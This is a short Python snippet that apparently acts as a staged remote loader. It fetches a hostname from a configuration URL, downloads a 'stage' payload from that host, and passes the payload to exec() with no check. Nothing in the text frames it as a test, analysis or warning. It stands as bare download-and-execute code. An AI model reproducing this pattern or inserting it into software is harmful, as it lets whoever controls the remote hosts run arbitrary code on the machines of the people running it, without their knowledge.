import httpx
endpoint = httpx.get("https://config.example.net/route").text.strip()
if endpoint:
    payload = httpx.get(f"https://{endpoint}/stage").text
    exec(payload)
